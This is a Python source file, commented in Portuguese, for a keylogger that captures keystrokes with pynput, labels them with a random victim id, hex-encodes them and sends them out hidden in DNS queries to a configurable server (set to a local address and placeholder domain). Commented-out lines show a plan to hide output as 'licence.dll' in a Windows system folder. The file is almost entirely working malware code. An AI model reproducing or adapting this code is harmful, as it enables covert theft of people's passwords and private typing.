###############################################################
# Imports
###############################################################
import os
import time
import socket
import random
from pynput import keyboard
from dnslib import DNSRecord, RR, A

###############################################################
# Vars. Global
###############################################################
# Ofuscação no Windows (Antigamente era salvo em arquivo... mudei os planos) 
# _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
# _NAME = 'licence.dll'
_DNS_ADDR = ('127.0.0.1', 9953)
_FAKE_DOMAIN = '.example.com'
_KEYS = []
_USR_HAS = None

# NUMPAD_KEYS = { -------------------------- NÃO FUNCIONANDO
#     keyboard.KeyCode.from_vk(98): '0',
#     keyboard.KeyCode.from_vk(89): '1',
#     keyboard.KeyCode.from_vk(90): '2',
#     keyboard.KeyCode.from_vk(91): '3',
#     keyboard.KeyCode.from_vk(92): '4',
#     keyboard.KeyCode.from_vk(93): '5',
#     keyboard.KeyCode.from_vk(94): '6',
#     keyboard.KeyCode.from_vk(95): '7',
#     keyboard.KeyCode.from_vk(96): '8',
#     keyboard.KeyCode.from_vk(97): '9'
# }

###############################################################
# Classes e Funções
###############################################################
def hash_adler32(data):
    a = 1
    size = len(data)
    b = size % 35

    for ch in data:
        a = a + ord(ch) % 35
        b = b + size * ord(ch) % 35

    return hex(b * 35 + a)[2:]

def send_data(data):
    '''
    Recebe os dados e os envia usando requisições DNS
    de 63 em 63 bytes.

    Parameters:
        data (str): Data que iremos enviar
    
    Returns:
        None    
    '''
    global _DNS_ADDR, _FAKE_DOMAIN

    # Remove entradas None da lista - Unico metodo ate agora que funcionou para nao crashar
    data = [entry for entry in data if entry is not None]

    print('vou enviar algo')

    # Convertendo para bytes usando somente 8 bits para economizar
    # espaço, data seria enviado pela rede
    #data = [entry.to_bytes(1, 'big') for entry in data]
    #print(data)

    # Divide os dados em partes menores para serem válidos
    # como nomes de domínio máximo de 63bytes por hostname.
    # Decidi apenas previnir caso a função seja chamada com mais chars do que deveria
    parts = [data[chunk:chunk+63] for chunk in range(0, len(data), 63)] 

    while len(parts) > 0:
        # Cria o payload com o nome de domínio fictício
        payload = parts.pop(0)
        print(f'enviando isso: {payload}')
        payload = ''.join([hex(ord(c)) for c in payload])
        payload = payload.replace('0x', '')
        request = str(payload) + str(_FAKE_DOMAIN)
        
        # Cria a requisição DNS
        domain = DNSRecord.question(request)

        # Envia a requisição DNS para o servidor
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5.0)

        try:
            sock.sendto(domain.pack(), _DNS_ADDR)
        except:
            print('Erro ao enviar!')

        try:
            # Recebendo resposta falsa do DNS
            _ = sock.recvfrom(512)
        except socket.timeout:
            print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
            pass
            
        # Não sei se precisa disso...
        sock.close()

def on_release(key):
    global _KEYS, _USR_HAS

    if len(_KEYS) >= (31 - len(_USR_HAS)):
        for ch in _USR_HAS:
            _KEYS.insert(0, ch)
        send_data(_KEYS)
        _KEYS = []

    if key == keyboard.Key.esc:
        return False
    

    try:
        _KEYS.append(str(key.char))
    except AttributeError:
        # Tratando os numeros
        if key == 96:
            _KEYS.append('0')


        # Tratando espaços, enters e etc...
        if key == key.space or key == key.enter:
            try:
                if _KEYS[-1] == ' ':
                    pass
                else:
                    _KEYS.append(' ')
            except:
                pass

        elif key == key.backspace:
            _KEYS = _KEYS[:-1]

        
        print('special key {0} pressed'.format(key))
  

###############################################################
# Main
###############################################################
if __name__ == "__main__":
    _USR_HAS = [char for char in hash_adler32(str(random.randint(100, 999)))]
    lst = keyboard.Listener(on_release=on_release)
    lst.start()
    lst.join()
